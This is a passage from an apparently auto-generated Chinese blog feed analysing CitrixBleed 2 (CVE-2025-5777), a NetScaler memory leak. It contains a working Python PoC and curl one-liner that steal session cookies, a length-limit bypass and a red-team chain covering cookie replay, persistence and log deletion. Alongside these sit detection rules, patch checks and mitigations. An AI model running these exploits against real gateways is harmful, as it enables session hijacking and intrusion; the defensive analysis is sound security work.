inform7">buf: <span class="hljs-comment">[-----XML-----]</span><span class="hljs-comment">[OOB]</span><span class="hljs-comment">[OOB]</span><span class="hljs-comment">[OOB]</span>......            &lt;- 0x1800 bytes limit<br>                          ↑<br>                被 ns_vpn_send_response 一并发出<br></code></pre></td></tr></table></figure><p>GDB 断点演示（关键寄存器）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">RDI</span> (dst) = <span class="hljs-number">0</span>x7fffa2e31800  // buf<br><span class="hljs-attribute">RSI</span> (len) = <span class="hljs-number">0</span>x00001e42      // length=<span class="hljs-number">7746</span> (&gt;<span class="hljs-number">6144</span>)<br></code></pre></td></tr></table></figure><p><code>read()</code> 结果显示后 1 600 字节来自未初始化内存，其中可见其他 SSL 会话的 Cookie 缓冲区。</p><h4 id="3-4-泄露的数据类别"><a href="#3-4-泄露的数据类别" class="headerlink" title="3.4  泄露的数据类别"></a>3.4  泄露的数据类别</h4><table><thead><tr><th>分类</th><th>示范片段（已脱敏）</th></tr></thead><tbody><tr><td>Session Cookie</td><td><code>Set-Cookie: NSC_USER=john.doe;NSC_TASS=abc123...</code></td></tr><tr><td>MFA&#x2F;OTP Token</td><td><code>radius_state=0e2a9c6d1553...</code></td></tr><tr><td>其他请求体</td><td><code>&lt;username&gt;audituser&lt;/username&gt;&lt;password&gt;***&lt;/password&gt;</code></td></tr></tbody></table><hr><h3 id="0x04-PoC-实现"><a href="#0x04-PoC-实现" class="headerlink" title="0x04  PoC 实现"></a>0x04  PoC 实现</h3><h4 id="4-1-单文件-Python（15-行）"><a href="#4-1-单文件-Python（15-行）" class="headerlink" title="4.1  单文件 Python（15 行）"></a>4.1  单文件 Python（15 行）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">## CVE-2025-5777 Minimal PoC  (authorized testing ONLY)</span><br><span class="hljs-keyword">import</span> requests, sys, urllib3, re<br>urllib3.disable_warnings()<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>    exit(<span class="hljs-string">f&quot;Usage: <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> https://NSVIP&quot;</span>)<br><br>url = sys.argv[<span class="hljs-number">1</span>].rstrip(<span class="hljs-string">&quot;/&quot;</span>) + <span class="hljs-string">&quot;/nf/auth/startwebview.do&quot;</span><br>hdr = &#123;<span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">0x6000</span>&#125;               <span class="hljs-comment"># &gt;0x1800 triggers</span><br>r = requests.get(url, headers=hdr, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">10</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] HTTP&quot;</span>, r.status_code, <span class="hljs-string">&quot;bytes:&quot;</span>, <span class="hljs-built_in">len</span>(r.content))<br>hits = re.findall(<span class="hljs-string">br&quot;(NSC_[A-Z]+=[^;]&#123;10,&#125;)&quot;</span>, r.content)<br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> hits: <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Cookie leak -&gt;&quot;</span>, h.decode())<br><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;leak.bin&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>).write(r.content)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Saved leak.bin for offline grep.&quot;</span>)<br></code></pre></td></tr></table></figure><ul><li>执行后如返回 200 + 数 KB，即判定存在漏洞。</li><li>进一步从 <code>leak.bin</code> 搜索 <code>Cookie=</code>、<code>&lt;AuthenticateContext&gt;</code> 等关键字。</li></ul><h4 id="4-2-Bash-curl-单行"><a href="#4-2-Bash-curl-单行" class="headerlink" title="4.2  Bash &#x2F; curl 单行"></a>4.2  Bash &#x2F; curl 单行</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -ks -H <span class="hljs-string">&quot;Host: <span class="hljs-subst">$(python -c &#x27;print(\&quot;A\&quot;*6000)</span>&#x27;)&quot;</span> \<br>     https://NSVIP/nf/auth/startwebview.do -o leak.bin<br></code></pre></td></tr></table></figure><blockquote><p><strong>旁路</strong>：部分设备在前置 F5 &#x2F; Nginx 做了 <code>Host</code> 长度限制；可改为多段子域拼接绕过，如<br><code>foo.foo.foo.…foo.example.com</code>（重复 3000 次 <code>foo</code>）。</p></blockquote><hr><h3 id="0x05-红队视角：完整攻击链"><a href="#0x05-红队视角：完整攻击链" class="headerlink" title="0x05  红队视角：完整攻击链"></a>0x05  红队视角：完整攻击链</h3><table><thead><tr><th>步骤</th><th>目的 &amp; 技巧</th></tr></thead><tbody><tr><td>① 资产发现</td><td><code>zoomeye search &quot;http.title:\&quot;NetScaler Gateway\&quot;&quot;</code> + Shodan 等；过滤 <code>set-cookie: NSC_</code></td></tr><tr><td>② POC 泄露</td><td>批量脚本并行请求；抓取 <code>NSC_USER= ; NSC_TASS=</code></td></tr><tr><td>③ Cookie 重播</td><td>Chrome DevTools→Application→Cookies→添加条目，刷新 <code>/vpn/index.html</code></td></tr><tr><td>④ 内网资源</td><td>访问 <code>storeweb/#home</code> 获取 RDP 文件；下载 <code>.ica</code> 直接登陆 VDI</td></tr><tr><td>⑤ 权限提升</td><td>内部凭据喷射、Kerberoast、ADCS ESC1；或利用同网段弱口令 SMB</td></tr><tr><td>⑥ 持久化</td><td>新建 Scheduled Task；注册自启动脚本；或修改 NetScaler vDisk（高权限需运维疏忽）</td></tr><tr><td>⑦ 痕迹清理</td><td>Cookie 用后即焚；删除 audit 日志（若拿到 NS root）；或利用 logrotate race 覆盖</td></tr></tbody></table><p>真实案例：ReliaQuest 在客户网关观察到“短时大量 6 KB+ <code>Host</code> 头请求 → 紧跟着会话被盗用”(<a href="https://reliaquest.com/blog/threat-spotlight-citrix-bleed-2-vulnerability-in-netscaler-adc-gateway-devices/?utm_source=chatgpt.com" title="Threat Spotlight: CVE-2025-5777: Citrix Bleed 2 Opens Old Wounds">reliaquest.com</a>)。</p><hr><h3 id="0x06-蓝队视角：检测、取证与补丁验证"><a href="#0x06-蓝队视角：检测、取证与补丁验证" class="headerlink" title="0x06  蓝队视角：检测、取证与补丁验证"></a>0x06  蓝队视角：检测、取证与补丁验证</h3><h4 id="6-1-日志与-IoC"><a href="#6-1-日志与-IoC" class="headerlink" title="6.1  日志与 IoC"></a>6.1  日志与 IoC</h4><table><thead><tr><th>来源</th><th>表现</th></tr></thead><tbody><tr><td><strong>&#x2F;var&#x2F;log&#x2F;ns.log</strong></td><td><code>AAA_TRANSACTION &lt;client_ip&gt; - Host header length: 6144</code></td></tr><tr><td><strong>HTTP_ACCESS.log</strong></td><td><code>/nf/auth/startwebview.do</code> 请求耗时极短但响应大小异常（&gt; 2 KB）</td></tr><tr><td><strong>EDR&#x2F;PCAP</strong></td><td><code>Set-Cookie: NSC_USER=</code> 出现在非登录请求的响应中</td></tr></tbody></table><h4 id="6-2-Sigma-规则（简要版）"><a href="#6-2-Sigma-规则（简要版）" class="headerlink" title="6.2  Sigma 规则（简要版）"></a>6.2  Sigma 规则（简要版）</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">title:</span> <span class="hljs-string">CitrixBleed2</span> <span class="hljs-string">Host</span> <span class="hljs-string">Header</span> <span class="hljs-string">OOB</span> <span class="hljs-string">Leak</span><br><span class="hljs-attr">status:</span> <span class="hljs-string">experimental</span><br><span class="hljs-attr">logsource:</span><br>  <span class="hljs-attr">category:</span> <span class="hljs-string">webserver</span><br>  <span class="hljs-attr">product:</span> <span class="hljs-string">netscaler</span><br><span class="hljs-attr">detection:</span><br>  <span class="hljs-attr">selection:</span><br>    <span class="hljs-attr">cs-uri-stem:</span> <span class="hljs-string">&quot;/nf/auth/startwebview.do&quot;</span><br>    <span class="hljs-string">cs-bytes|gt:</span> <span class="hljs-number">2048</span><br>    <span class="hljs-string">c-host|strlen|gt:</span> <span class="hljs-number">4096</span><br>  <span class="hljs-attr">condition:</span> <span class="hljs-string">selection</span><br><span class="hljs-attr">level:</span> <span class="hljs-string">critical</span><br></code></pre></td></tr></table></figure><h4 id="6-3-补丁验证脚本"><a href="#6-3-补丁验证脚本" class="headerlink" title="6.3  补丁验证脚本"></a>6.3  补丁验证脚本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nscli -s 127.0.0.1:3008 \<br>      -c <span class="hljs-string">&quot;show ns version&quot;</span> | grep -E <span class="hljs-string">&quot;13\.1-58\.32|14\.1-43\.56&quot;</span> \<br>      &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Patched ✅&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Vulnerable ❌&quot;</span><br></code></pre></td></tr></table></figure><h4 id="6-4-Kill-会话"><a href="#6-4-Kill-会话" class="headerlink" title="6.4  Kill 会话"></a>6.4  Kill 会话</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">## 清除全部活动 VPN/ICA 连接</span><br><span class="hljs-built_in">kill</span> icaconnection -all<br><span class="hljs-built_in">kill</span> vpn -all<br></code></pre></td></tr></table></figure><blockquote><p><strong>注意</strong>：补丁后仍需强制注销，防止攻击者继续使用已窃取 Cookie。</p></blockquote><hr><h3 id="0x07-防御加固"><a href="#0x07-防御加固" class="headerlink" title="0x07  防御加固"></a>0x07  防御加固</h3><ol><li><strong>官方补丁</strong>：升至 ≥ 14.1-43.56 &#x2F; 13.1-58.32，或对 FIPS&#x2F;NDcPP 机型套用对应版本 (<a href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)。</li><li><strong>Host Header 长度限制</strong>（临时措施）</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">map</span> <span class="hljs-variable">$http_host</span> <span class="hljs-variable">$block_long_host</span> &#123;<br>    <span class="hljs-attribute">default</span>          <span class="hljs-number">0</span>;<br>    &quot;~^.&#123;4097,&#125;$&quot;    1;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br>    ...<br>    <span class="hljs-attribute">if</span> (<span class="hljs-variable">$block_long_host</span>) &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">413</span>; &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>WAF 自适应规则</strong>：对 <code>/nf/auth/</code> &amp; <code>/oauth/</code> 路径启用速率限制 (e.g. 20 req&#x2F;m)。</li><li><strong>资产清点</strong>：EOL 版本 12.1&#x2F;13.0 永远不再收到官方补丁，计划替换或强隔离 (<a href="https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX693420&utm_source=chatgpt.com" title="CVE-2025-5777 - CITRIX | Support">support.citrix.com</a>)。</li><li><strong>MFA 安全</strong>：会话泄露绕过 MFA → 建议开启“每请求签名”或“动态绑定硬件指纹”，而非仅首登时验证。</li></ol><hr><h3 id="0x08-学习-复习路线"><a href="#0x08-学习-复习路线" class="headerlink" title="0x08  学习 &#x2F; 复习路线"></a>0x08  学习 &#x2F; 复习路线</h3><table><thead><tr><th>阶段</th><th>建议资料 &amp; 操作</th></tr></thead><tbody><tr><td><strong>理论</strong></td><td>阅读 Citrix 安全公告、Arctic Wolf &#x2F; Tenable FAQ、Bishop Fox 技术拆解 (<a href="https://arcticwolf.com/resources/blog/cve-2025-5777/?utm_source=chatgpt.com" title="CVE-2025-5777 | Arctic Wolf">arcticwolf.com</a>, <a href="https://www.tenable.com/blog/cve-2025-5777-cve-2025-6543-frequently-asked-questions-about-citrixbleed-2?utm_source=chatgpt.com" title="CVE-2025-5777, CVE-2025-6543: Frequently Asked Questions ...">tenable.com</a>, <a href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)</td></tr><tr><td><strong>实验</strong></td><td>部署 vuln 版 13.1-55.18（ESXi &#x2F; KVM），跑最小 PoC，Wireshark 抓包 → 观察 <code>TCP PSH</code> 回包</td></tr><tr><td><strong>编码</strong></td><td>改写 PoC：加入自动 Cookie 重播、ZTLS 批量扫描、多线程队列</td></tr><tr><td><strong>蓝队</strong></td><td>以两小时为窗口搜索异常 Host 长度；用 Sigma-→Elastic&#x2F;Graylog；复现并验证 WAF 策略</td></tr><tr><td><strong>分享</strong></td><td>编写博客或制作思维导图，总结“同类 snprintf 使用陷阱”</td></tr></tbody></table><hr><h3 id="附录-A-—-检测-防御片段"><a href="#附录-A-—-检测-防御片段" class="headerlink" title="附录 A — 检测 &#x2F; 防御片段"></a>附录 A — 检测 &#x2F; 防御片段</h3><details><summary>📜 Sigma 规则完整版</summary><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">title:</span> <span class="hljs-string">Netscaler</span> <span class="hljs-string">CitrixBleed2</span> <span class="hljs-string">Large</span> <span class="hljs-string">Host</span> <span class="hljs-string">Header</span><br><span class="hljs-attr">id:</span> <span class="hljs-string">4d6f1e1b-0bfe-4473-a732-3e7e9a21f650</span><br><span class="hljs-attr">status:</span> <span class="hljs-string">experimental</span><br><span class="hljs-attr">description:</span> <span class="hljs-string">Detects</span> <span class="hljs-string">abnormal</span> <span class="hljs-string">Host</span> <span class="hljs-string">header</span> <span class="hljs-string">length</span> <span class="hljs-string">in</span> <span class="hljs-string">requests</span> <span class="hljs-string">to</span> <span class="hljs-string">/nf/auth/startwebview.do</span><br><span class="hljs-attr">references:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">https://nvd.nist.gov/vuln/detail/CVE-2025-5777</span><br><span class="hljs-attr">author:</span> <span class="hljs-string">mingshenhk</span><br><span class="hljs-attr">logsource:</span><br>  <span class="hljs-attr">product:</span> <span class="hljs-string">netscaler</span><br>  <span class="hljs-attr">service:</span> <span class="hljs-string">http_access</span><br><span class="hljs-attr">detection:</span><br>  <span class="hljs-attr">selection:</span><br>    <span class="hljs-attr">cs-uri-stem:</span> <span class="hljs-string">&quot;/nf/auth/startwebview.do&quot;</span><br>    <span class="hljs-string">c-host|strlen|gt:</span> <span class="hljs-number">4096</span><br>  <span class="hljs-attr">condition:</span> <span class="hljs-string">selection</span><br><span class="hljs-attr">level:</span> <span class="hljs-string">critical</span><br></code></pre></td></tr></table></figure></details><details><summary>🛡️ Suricata 规则</summary><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs suricata">alert http any any -&gt; any any (<br>  msg:&quot;CitrixBleed2 CVE-2025-5777 Host header overflow&quot;;<br>  http.uri; content:&quot;/nf/auth/startwebview.do&quot;; nocase;<br>  http.header; field:Host; content:&quot;AAAAAAAA&quot;; within:0; distance:0; offset:4096;<br>  classtype:attempted-recon;<br>  sid:5777002; rev:1;<br>)<br></code></pre></td></tr></table></figure></details><details><summary>🔒 Nginx-Lua Inline Hotpatch</summary><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-comment">-- access_by_lua_block</span><br><span class="hljs-keyword">local</span> host = ngx.var.http_host <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> #host &gt; <span class="hljs-number">4096</span> <span class="hljs-keyword">then</span><br>  ngx.<span class="hljs-built_in">log</span>(ngx.WARN,<span class="hljs-string">&quot;[CitrixBleed2] Blocked Host len=&quot;</span>,#host)<br>  <span class="hljs-keyword">return</span> ngx.<span class="hljs-built_in">exit</span>(ngx.HTTP_REQUEST_HEADER_FIELDS_TOO_LARGE)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure></details><hr><h3 id="附录-B-—-时间轴"><a href="#附录-B-—-时间轴" class="headerlink" title="附录 B — 时间轴"></a>附录 B — 时间轴</h3><table><thead><tr><th>日期 (2025)</th><th>事件</th></tr></thead><tbody><tr><td>06-17</td><td>Citrix 初次发布 CVE-2025-5777 公告 (<a href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)</td></tr><tr><td>06-18</td><td>Bishop Fox 首发技术拆解 &amp; PoC (<a href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)</td></tr><tr><td>06-23</td><td>Citrix 更新影响范围 + 补丁版本；CISA 将其列入 KEV</td></tr><tr><td>06-25</td><td>ReliaQuest 报告活跃利用，威胁组正批量窃取会话 (<a href="https://reliaquest.com/blog/threat-spotlight-citrix-bleed-2-vulnerability-in-netscaler-adc-gateway-devices/?utm_source=chatgpt.com" title="Threat Spotlight: CVE-2025-5777: Citrix Bleed 2 Opens Old Wounds">reliaquest.com</a>)</td></tr><tr><td>06-27</td><td>BleepingComputer 报道“可能已大规模被利用” (<a href="https://www.bleepingcomputer.com/news/security/citrix-bleed-2-flaw-now-believed-to-be-exploited-in-attacks/?utm_source=chatgpt.com" title="Citrix Bleed 2 flaw now believed to be exploited in attacks">bleepingcomputer.com</a>)</td></tr><tr><td>06-28</td><td>多个 GitHub PoC 出现；Tenable 发布 FAQ (<a href="https://www.tenable.com/blog/cve-2025-5777-cve-2025-6543-frequently-asked-questions-about-citrixbleed-2?utm_source=chatgpt.com" title="CVE-2025-5777, CVE-2025-6543: Frequently Asked Questions ...">tenable.com</a>)</td></tr></tbody></table><hr><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ol><li>Citrix 官方安全通告与补丁说明 (<a href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)</li><li>Arctic Wolf《CVE-2025-5777 技术简报》 (<a href="https://arcticwolf.com/resources/blog/cve-2025-5777/?utm_source=chatgpt.com" title="CVE-2025-5777 | Arctic Wolf">arcticwolf.com</a>)</li><li>Bishop Fox《OOB Memory Read in NetScaler》 (<a href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)</li><li>ReliaQuest《Threat Spotlight: CitrixBleed 2》 (<a href="https://reliaquest.com/blog/threat-spotlight-citrix-bleed-2-vulnerability-in-netscaler-adc-gateway-devices/?utm_source=chatgpt.com" title="Threat Spotlight: CVE-2025-5777: Citrix Bleed 2 Opens Old Wounds">reliaquest.com</a>)</li><li>Tenable FAQ on CVE-2025-5777 (<a href="https://www.tenable.com/blog/cve-2025-5777-cve-2025-6543-frequently-asked-questions-about-citrixbleed-2?utm_source=chatgpt.com" title="CVE-2025-5777, CVE-2025-6543: Frequently Asked Questions ...">tenable.com</a>)</li><li>BleepingComputer 安全快讯 (<a href="https://www.bleepingcomputer.com/news/security/citrix-bleed-2-flaw-now-believed-to-be-exploited-in-attacks/?utm_source=chatgpt.com" title="Citrix Bleed 2 flaw now believed to be exploited in attacks">bleepingcomputer.com</a>)</li><li>NVD CVE-2025-5777 条目 (<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5777?utm_source=chatgpt.com" title="CVE-2025-5777 Detail - NVD">nvd.nist.gov</a>)</li><li>Citrix Support KB CTX693420 (<a href="https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX693420&utm_source=chatgpt.com" title="CVE-2025-5777 - CITRIX | Support">support.citrix.com</a>)</li></ol><blockquote><p><strong>完</strong> — 希望本文档能帮助你全方位理解并应对 CitrixBleed 2。如果需要进一步补充示例、脚本或演练指导，欢迎继续提出！</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Citrix NetScaler ADC&amp;#x2F;Gateway 越界内存读</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
  </entry>
  
  <entry>
    <title>Github Poc</title>
    <link href="http://example.com/2025/06/30/github_2926243623/"/>
    <id>http://example.com/2025/06/30/github_2926243623/</id>
    <published>2025-06-30T11:15:11.758Z</published>
    <updated>2025-06-30T11:15:11.753Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> </p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-27388</li></ul><p><strong>来源：</strong> <a href="https://github.com/Mahesh-970/CVE-2024-27388_afterPatch_validation">https://github.com/Mahesh-970/CVE-2024-27388_afterPatch_validation</a></p><p><strong>类型：</strong> CVE-2024:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>.whitesource</li><li>gss_rpc_xdr.c</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
    
  </entry>
  
</feed>
